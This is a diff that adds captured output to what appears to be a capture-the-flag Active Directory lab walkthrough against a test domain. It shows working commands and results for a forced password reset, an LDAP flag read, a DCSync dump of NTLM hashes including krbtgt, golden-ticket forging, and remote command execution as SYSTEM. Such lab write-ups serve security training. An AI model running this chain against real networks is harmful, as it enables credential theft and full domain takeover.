@@ -13,10 +13,18 @@ Command:
 nxc smb 192.168.56.20 -u 'bh_helpdesk' -p 'User@2025!' --continue-on-success
 ```
 
+Output:
+`SMB         192.168.56.20   445    DC01             [+] PENTESTLAB.local\bh_helpdesk:User@2025!`
+
+
 ```bash
 bloodyad -u bh_helpdesk -p 'User@2025!' -d PENTESTLAB.local --host 192.168.56.20 set password bh_sysadmin 'password1234'
 
 ```
+
+Output:
+`[+] Password changed successfully!` 
+
 
 Explanation:
 
@@ -46,6 +54,10 @@ nxc ldap 192.168.56.20 -u 'bh_sysadmin' -p 'password1234' --base-dn "DC=PENTESTL
 
 ```
 
+Output:
+`LDAP        192.168.56.20   389    DC01             homePhone            BHFLAG5{DCSYNC_DOM41N_C0MPR0M1S3_F5}`
+
+
 Explanation:
 
 * `nxc ldap`: Invokes NetExec's lightweight directory interrogation driver to efficiently extract information over port 389.
@@ -72,6 +84,23 @@ Command:
 ```bash
 impacket-secretsdump PENTESTLAB.local/bh_sysadmin:'password1234'@192.168.56.20
 
+```
+
+Output:
+```
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:b817733bdc947930b700cc2e567fb3ad:::
+
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc68a017e37f5da683a3e4128630abc:::
+
+PENTESTLAB.local\jadmin:1103:aad3b435b51404eeaad3b435b51404ee:7099909e93b8345e3def4331473b8235:::
+
+PENTESTLAB.local\ssupport:1104:aad3b435b51404eeaad3b435b51404ee:2492c670a97117e697e18b40c2ffec62:::
 ```
 
 Explanation:
@@ -114,6 +143,17 @@ Command:
 impacket-lookupsid PENTESTLAB.local/bh_sysadmin:'password1234'@192.168.56.20 0
 ```
 
+Output:
+```
+[*] Brute forcing SIDs at 192.168.56.20
+
+[*] StringBinding ncacn_np:192.168.56.20[\pipe\lsarpc]
+
+[*] Domain SID is: S-1-5-21-281050671-1125578517-3338290938
+
+```
+
+
 ```bash
 impacket-ticketer -nthash 5bc68a017e37f5da683a3e4128630abc -domain-sid "S-1-5-21-281050671-1125578517-3338290938" -domain PENTESTLAB.local Administrator
 
@@ -151,7 +191,63 @@ export KRB5CCNAME=Administrator.ccache
 nxc smb dc01.pentestlab.local --use-kcache -x "net users /domain"
 nxc wmi dc01.pentestlab.local --use-kcache -x "net users /domain"
 nxc smb dc01.pentestlab.local --use-kcache --exec-method atexec -x "whoami"
+```
 
+
+Output:
+```
+┌──(root㉿kali)-[~/loot/ldap_out/ADRecon]
+└─# nxc smb dc01.pentestlab.local --use-kcache -x "whoami"
+SMB         dc01.pentestlab.local 445    DC01             [*] Windows Server 2019 Datacenter Evaluation 17763 x64 (name:DC01) (domain:PENTESTLAB.local) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         dc01.pentestlab.local 445    DC01             [+] PENTESTLAB.LOCAL\Administrator from ccache (Pwn3d!)
+SMB         dc01.pentestlab.local 445    DC01             [+] Executed command via wmiexec
+SMB         dc01.pentestlab.local 445    DC01             pentestlab.local\administrator
+                                                                                                                                                                                                                    
+┌──(root㉿kali)-[~/loot/ldap_out/ADRecon]
+└─# nxc smb dc01.pentestlab.local --use-kcache -x "net users /domain"
+SMB         dc01.pentestlab.local 445    DC01             [*] Windows Server 2019 Datacenter Evaluation 17763 x64 (name:DC01) (domain:PENTESTLAB.local) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         dc01.pentestlab.local 445    DC01             [+] PENTESTLAB.LOCAL\Administrator from ccache (Pwn3d!)
+SMB         dc01.pentestlab.local 445    DC01             [-] wmiexec: Could not retrieve output file, it may have been detected by AV. If it is still failing, try the 'wmi' protocol or another exec method
+SMB         dc01.pentestlab.local 445    DC01             [+] Executed command via wmiexec
+                                                                                                                                                                                                                    
+┌──(root㉿kali)-[~/loot/ldap_out/ADRecon]
+└─# nxc wmi dc01.pentestlab.local --use-kcache -x "net users /domain"
+RPC         dc01.pentestlab.local 135    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:PENTESTLAB.local)
+WMI         dc01.pentestlab.local 135    DC01             [+] PENTESTLAB.local\Administrator from ccache (Pwn3d!)
+WMI         dc01.pentestlab.local 135    DC01             [+] Executed command: "net users /domain" via wmiexec
+WMI         dc01.pentestlab.local 135    DC01             User accounts for \\
+WMI         dc01.pentestlab.local 135    DC01             -------------------------------------------------------------------------------
+WMI         dc01.pentestlab.local 135    DC01             Administrator            aharris                  alice.martin
+WMI         dc01.pentestlab.local 135    DC01             bh_auditor               bh_devops                bh_helpdesk
+WMI         dc01.pentestlab.local 135    DC01             bh_intern                bh_sysadmin              bob.dupont
+WMI         dc01.pentestlab.local 135    DC01             brecruiter               carol.white              cfinance
+WMI         dc01.pentestlab.local 135    DC01             daccountant              david.brown              dreeves
+WMI         dc01.pentestlab.local 135    DC01             ecfo                     fsales                   gmanager
+WMI         dc01.pentestlab.local 135    DC01             gsales                   Guest                    hr_manager
+WMI         dc01.pentestlab.local 135    DC01             hrep                     iauditor                 jadmin
+WMI         dc01.pentestlab.local 135    DC01             jmartin                  krbtgt                   labuser
+WMI         dc01.pentestlab.local 135    DC01             legacy                   luser                    mmanager
+WMI         dc01.pentestlab.local 135    DC01             mwebb                    ncross                   old.admin
+WMI         dc01.pentestlab.local 135    DC01             oldadmin                 ostone                   pv_auditor
+WMI         dc01.pentestlab.local 135    DC01             pv_gpo                   pv_helpdesk              pv_intern
+WMI         dc01.pentestlab.local 135    DC01             pv_manager               pv_ops                   pv_scout
+WMI         dc01.pentestlab.local 135    DC01             rfoster                  ssupport                 student
+WMI         dc01.pentestlab.local 135    DC01             svc.backup               svc.web                  svc_app
+WMI         dc01.pentestlab.local 135    DC01             svc_backup               svc_deploy               svc_iis
+WMI         dc01.pentestlab.local 135    DC01             svc_monitor              svc_mssql                svc_pki
+WMI         dc01.pentestlab.local 135    DC01             svc_print                svc_relay                svc_reporting
+WMI         dc01.pentestlab.local 135    DC01             svc_sql                  svc_sql2                 svc_web
+WMI         dc01.pentestlab.local 135    DC01             temp.user                tempadmin                vhayes
+WMI         dc01.pentestlab.local 135    DC01             The command completed with one or more errors.
+```
+
+```
+┌──(root㉿kali)-[~/loot/ldap_out/ADRecon]
+└─# nxc smb dc01.pentestlab.local --use-kcache --exec-method atexec -x "whoami"
+SMB         dc01.pentestlab.local 445    DC01             [*] Windows Server 2019 Datacenter Evaluation 17763 x64 (name:DC01) (domain:PENTESTLAB.local) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         dc01.pentestlab.local 445    DC01             [+] PENTESTLAB.LOCAL\Administrator from ccache (Pwn3d!)
+SMB         dc01.pentestlab.local 445    DC01             [+] Executed command via atexec
+SMB         dc01.pentestlab.local 445    DC01             nt authority\system
 ```
 
 Explanation:
